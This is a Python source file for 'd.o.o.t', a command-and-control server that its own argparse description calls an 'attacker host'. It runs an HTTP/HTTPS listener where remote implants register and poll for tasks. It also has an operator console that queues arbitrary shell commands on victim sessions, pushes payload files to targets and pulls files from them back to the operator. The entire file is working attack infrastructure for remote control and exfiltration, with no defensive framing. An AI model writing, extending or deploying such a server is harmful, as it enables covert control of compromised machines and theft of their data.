#!/usr/bin/env python3
import argparse
import base64
import queue
import threading
import time
import uuid
import generate_cert
import ssl

try:
    import readline
except ImportError:
    pass
from collections import defaultdict, deque
from dataclasses import dataclass
from datetime import datetime, timezone
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Mapping, cast
from urllib.parse import parse_qs, urlparse


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


@dataclass
class Session:
    session_id: str
    os_name: str
    channel: str
    last_seen: float


class DootState:
    def __init__(self) -> None:
        self.sessions: dict[str, Session] = {}
        self.tasks: dict[str, deque[str]] = defaultdict(deque)
        self.downloads: dict[str, bytes] = {}
        self.pull_jobs: dict[str, Path] = {}
        self.cmd_jobs: dict[str, str] = {}
        self.events: "queue.Queue[str]" = queue.Queue()
        self.lock = threading.Lock()

    def register(self, session_id: str, os_name: str, channel: str) -> None:
        with self.lock:
            self.sessions[session_id] = Session(
                session_id=session_id,
                os_name=os_name,
                channel=channel,
                last_seen=time.time(),
            )
        self.events.put(f"[{now_iso()}] registered {session_id} os={os_name} channel={channel}")

    def touch(self, session_id: str) -> None:
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].last_seen = time.time()

    def queue_push(self, session_id: str, local_src: Path, remote_dst: str) -> None:
        payload = local_src.read_bytes()
        token = str(uuid.uuid4())
        task = f"PUSH {token} {base64.urlsafe_b64encode(remote_dst.encode()).decode()}"
        with self.lock:
            self.downloads[token] = payload
            self.tasks[session_id].append(task)
        self.events.put(f"[{now_iso()}] queued PUSH {session_id} {local_src} -> {remote_dst}")

    def queue_pull(self, session_id: str, remote_src: str, local_dst: Path) -> None:
        token = str(uuid.uuid4())
        task = f"PULL {token} {base64.urlsafe_b64encode(remote_src.encode()).decode()}"
        with self.lock:
            self.pull_jobs[token] = local_dst
            self.tasks[session_id].append(task)
        self.events.put(f"[{now_iso()}] queued PULL {session_id} {remote_src} -> {local_dst}")

    def queue_ls(self, session_id: str, path: str = ".") -> None:
        token = str(uuid.uuid4())
        task = f"LS {token} {base64.urlsafe_b64encode(path.encode()).decode()}"
        with self.lock:
            self.cmd_jobs[token] = f"ls {path}"
            self.tasks[session_id].append(task)
        self.events.put(f"[{now_iso()}] queued LS {session_id} {path}")

    def queue_cmd(self, session_id: str, command: str) -> None:
        token = str(uuid.uuid4())
        task = f"CMD {token} {base64.urlsafe_b64encode(command.encode()).decode()}"
        with self.lock:
            self.cmd_jobs[token] = f"cmd: {command}"
            self.tasks[session_id].append(task)
        self.events.put(f"[{now_iso()}] queued CMD {session_id} '{command}'")

    def next_task(self, session_id: str) -> str:
        with self.lock:
            q = self.tasks.get(session_id)
            if q and len(q) > 0:
                return q.popleft()
        return "IDLE"


class Handler(BaseHTTPRequestHandler):
    server_version = "doot/0.1"

    @property
    def doot_server(self) -> "DootServer":
        return cast("DootServer", self.server)

    @staticmethod
    def _query_value(params: Mapping[str, list[str]], key: str, default: str = "") -> str:
        values = params.get(key)
        if not values:
            return default
        return next(iter(values), default)

    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/ping":
            self._ok_text("pong")
            return

        if path == "/api/register":
            params = parse_qs(parsed.query)
            session_id = self._query_value(params, "id", "")
            os_name = self._query_value(params, "os", "unknown")
            channel = self._query_value(params, "channel", "unknown")
            if not session_id:
                self._err(HTTPStatus.BAD_REQUEST, b"missing id")
                return
            self.doot_server.state.register(session_id, os_name, channel)
            self._ok_text("ok")
            return

        if path.startswith("/api/task/"):
            _, _, session_id = path.rpartition("/")
            self.doot_server.state.touch(session_id)
            self._ok_text(self.doot_server.state.next_task(session_id))
            return

        if path.startswith("/api/download/"):
            prefix = "/api/download/"
            if not path.startswith(prefix):
                self._err(HTTPStatus.BAD_REQUEST, b"bad token")
                return
            tail = path.removeprefix(prefix)
            if "/" not in tail:
                self._err(HTTPStatus.BAD_REQUEST, b"bad token")
                return
            _, _, token = tail.partition("/")
            if not token:
                self._err(HTTPStatus.BAD_REQUEST, b"bad token")
                return
            with self.doot_server.state.lock:
                payload = self.doot_server.state.downloads.get(token)
            if payload is None:
                self._err(HTTPStatus.NOT_FOUND, b"not found")
                return
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        self._err(HTTPStatus.NOT_FOUND, b"not found")

    def do_POST(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        if path.startswith("/api/upload/"):
            prefix = "/api/upload/"
            if not path.startswith(prefix):
                self._err(HTTPStatus.BAD_REQUEST, b"bad upload path")
                return
            tail = path.removeprefix(prefix)
            if "/" not in tail:
                self._err(HTTPStatus.BAD_REQUEST, b"bad upload path")
                return
            _, _, token = tail.partition("/")
            if not token:
                self._err(HTTPStatus.BAD_REQUEST, b"bad upload path")
                return
            n = int(self.headers.get("Content-Length", "0"))
            data = self.rfile.read(n)
            
            with self.doot_server.state.lock:
                dst = self.doot_server.state.pull_jobs.pop(token, None)
                cmd_type = self.doot_server.state.cmd_jobs.pop(token, None)

            if cmd_type:
                # This was a command output upload, print it to the operator
                output = data.decode("utf-8", errors="replace")
                self.doot_server.state.events.put(f"[{now_iso()}] output for {cmd_type} (token={token}):\n{output}")
                self._ok_text("ok")
                return

            if dst is None:
                self._err(HTTPStatus.NOT_FOUND, b"unknown token")
                return
            dst.parent.mkdir(parents=True, exist_ok=True)
            dst.write_bytes(data)
            self.doot_server.state.events.put(f"[{now_iso()}] received PULL token={token} -> {dst}")
            self._ok_text("ok")
            return

        self._err(HTTPStatus.NOT_FOUND, b"not found")

    def _ok_text(self, text: str) -> None:
        body = text.encode()
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _err(self, code: HTTPStatus, body: bytes) -> None:
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args) -> None:
        pass


class DootServer(ThreadingHTTPServer):
    def __init__(self, addr: tuple[str, int], state: DootState):
        super().__init__(addr, Handler)
        self.state = state


def render_sessions(state: DootState) -> str:
    rows = []
    with state.lock:
        for sess in state.sessions.values():
            age = int(time.time() - sess.last_seen)
            rows.append(f"{sess.session_id:20} {sess.os_name:10} {sess.channel:10} last_seen={age}s")
    if not rows:
        return "no sessions"
    return "\n".join(sorted(rows))


def operator_loop(state: DootState) -> None:
    print(r"""
  _____          ____          ____      _______ 
 |  __ \        / __ \        / __ \    |__   __|
 | |  | |      | |  | |      | |  | |      | |   
 | |  | |      | |  | |      | |  | |      | |   
 | |__| |  _   | |__| |  _   | |__| |  _   | |   _
 |_____/  (_)   \____/  (_)   \____/  (_)  |_|  (_) 
                                                 
  Dropping Ordinance On Target - v1.0.0
                                                 """)
    print("d.o.o.t host ready. commands: help, sessions, ls, push, pull, generate-cert, quit")

    # Run the blocking input() in a background thread so we can constantly process events
    input_queue: "queue.Queue[str]" = queue.Queue()
    ready_for_input = threading.Event()
    ready_for_input.set()
    
    def read_input() -> None:
        while True:
            ready_for_input.wait()
            try:
                raw = input("[doot]> ").strip()
                ready_for_input.clear()
                input_queue.put(raw)
            except EOFError:
                ready_for_input.clear()
                input_queue.put("quit")
                break
                
    threading.Thread(target=read_input, daemon=True).start()

    while True:
        while not state.events.empty():
            print("\r\033[K" + state.events.get().strip())
            if ready_for_input.is_set():
                print("[doot]> ", end="", flush=True)
                try:
                    import readline
                    readline.redisplay()
                except Exception:
                    pass
            
        try:
            raw = input_queue.get(timeout=0.2)
        except queue.Empty:
            continue
            
        try:
            if not raw:
                continue

            cmd, _, rest = raw.partition(" ")
            cmd = cmd.lower().strip()
            rest = rest.strip()
    
            def get_default_session() -> str | None:
                with state.lock:
                    if not state.sessions:
                        return None
                    return max(state.sessions.values(), key=lambda s: s.last_seen).session_id
    
            if cmd == "help":
                print("")
                print("sessions")
                print("ls [session_id] [path]")
                print("cmd [session_id] <command>")
                print("push [session_id] <local_src> [remote_dst]")
                print("pull [session_id] <remote_src> [local_dst]")
                print("generate-cert")
                print("quit")
                continue
    
            if cmd == "sessions":
                print("")
                print(render_sessions(state))
                print("")
                continue
    
            if cmd == "ls":
                ls_parts = rest.split(" ", 1)
                path = "."
                
                if len(ls_parts) == 2:
                    # E.g. `ls h4x-1234 /tmp`
                    session_id, path = ls_parts
                elif len(ls_parts) == 1 and ls_parts[0]:
                    part = ls_parts[0]
                    if part in state.sessions:
                        # User only provided session id: `ls h4x-1234`
                        session_id = part
                    else:
                        # User only provided path: `ls /tmp`
                        session_id = get_default_session()
                        if not session_id:
                            print("no active sessions available")
                            continue
                        print(f"using default session: {session_id}")
                        path = part
                else:
                    session_id = get_default_session()
                    if not session_id:
                        print("no active sessions available")
                        continue
                    print(f"using default session: {session_id}")
    
                if session_id not in state.sessions:
                    print(f"unknown session: {session_id}")
                    continue
                
                state.queue_ls(session_id, path)
                continue
    
            if cmd == "cmd":
                cmd_parts = rest.split(" ", 1)
                if not rest:
                    print("usage: cmd [session_id] <command>")
                    continue
    
                if len(cmd_parts) == 2 and cmd_parts[0] in state.sessions:
                    session_id, exec_cmd = cmd_parts
                else:
                    session_id = get_default_session()
                    if not session_id:
                        print("no active sessions available")
                        continue
                    print(f"using default session: {session_id}")
                    exec_cmd = rest
    
                if session_id not in state.sessions:
                    print(f"unknown session: {session_id}")
                    continue
                
                state.queue_cmd(session_id, exec_cmd)
                continue
    
            if cmd == "push":
                push_parts = rest.split()
                session_id = None
                local_src_s = None
                remote_dst = None
    
                if len(push_parts) == 3:
                    session_id, local_src_s, remote_dst = push_parts
                elif len(push_parts) == 2:
                    # Could be `push <session_id> <local_src>` OR `push <local_src> <remote_dst>`
                    part1, part2 = push_parts
                    if part1 in state.sessions:
                        session_id = part1
                        local_src_s = part2
                        remote_dst = Path(local_src_s).name
                    else:
                        session_id = get_default_session()
                        if session_id:
                            print(f"using default session: {session_id}")
                        local_src_s = part1
                        remote_dst = part2
                elif len(push_parts) == 1 and push_parts[0] and push_parts[0] not in state.sessions:
                    # Just `push <local_src>`
                    session_id = get_default_session()
                    if session_id:
                        print(f"using default session: {session_id}")
                    local_src_s = push_parts[0]
                    remote_dst = Path(local_src_s).name
                else:
                    print("usage: push [session_id] <local_src> [remote_dst]")
                    continue
                    
                if not session_id:
                    print("no active sessions available")
                    continue
                if session_id not in state.sessions:
                    print(f"unknown session: {session_id}")
                    continue
    
                local_src = Path(local_src_s).expanduser().resolve()
                if not local_src.exists():
                    print(f"missing local file: {local_src}")
                    continue
                try:
                    state.queue_push(session_id, local_src, remote_dst)
                except Exception as exc:
                    print(f"push failed: {exc}")
                continue
    
            if cmd == "pull":
                pull_parts = rest.split()
                session_id = None
                remote_src = None
                local_dst_s = None
    
                if len(pull_parts) == 3:
                    session_id, remote_src, local_dst_s = pull_parts
                elif len(pull_parts) == 2:
                    # Could be `pull <session_id> <remote_src>` OR `pull <remote_src> <local_dst>`
                    part1, part2 = pull_parts
                    if part1 in state.sessions:
                        session_id = part1
                        remote_src = part2
                        # The target usually uses / paths, extract name
                        local_dst_s = str(Path(remote_src).name)
                    else:
                        session_id = get_default_session()
                        if session_id:
                            print(f"using default session: {session_id}")
                        remote_src = part1
                        local_dst_s = part2
                elif len(pull_parts) == 1 and pull_parts[0] and pull_parts[0] not in state.sessions:
                    # Just `pull <remote_src>`
                    session_id = get_default_session()
                    if session_id:
                        print(f"using default session: {session_id}")
                    remote_src = pull_parts[0]
                    local_dst_s = str(Path(remote_src).name)
                else:
                    print("usage: pull [session_id] <remote_src> [local_dst]")
                    continue
    
                if not session_id:
                    print("no active sessions available")
                    continue
                if session_id not in state.sessions:
                    print(f"unknown session: {session_id}")
                    continue
                    
                local_dst = Path(local_dst_s).expanduser().resolve()
                try:
                    state.queue_pull(session_id, remote_src, local_dst)
                except Exception as exc:
                    print(f"pull failed: {exc}")
                continue
    
            if cmd == "generate-cert":
                crt = Path("server.crt")
                key = Path("server.key")
                if crt.exists() and key.exists():
                    print(f"certificates already exist in the current directory ({crt.name}, {key.name})")
                else:
                    try:
                        generate_cert.generate_self_signed_cert()
                        print("successfully generated self-signed certificates. Please restart the host to apply them.")
                    except Exception as e:
                        print(f"failed to generate certificates: {e}")
                continue
    
            if cmd in ("quit", "exit"):
                break
    
            print("invalid command; run help")
        finally:
            ready_for_input.set()


def main() -> None:
    parser = argparse.ArgumentParser(description="d.o.o.t attacker host")
    parser.add_argument("--bind", default="0.0.0.0", help="bind address")
    parser.add_argument("--port", type=int, default=8443, help="listen port")
    args = parser.parse_args()

    state = DootState()
    server = DootServer((args.bind, args.port), state)

    crt = Path("server.crt")
    key = Path("server.key")
    if crt.exists() and key.exists():
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=crt, keyfile=key)
        server.socket = context.wrap_socket(server.socket, server_side=True)
        protocol = "https"
    else:
        protocol = "http"
        
    print(f"Server listening on {protocol}://{args.bind}:{args.port}")

    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()

    try:
        operator_loop(state)
    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
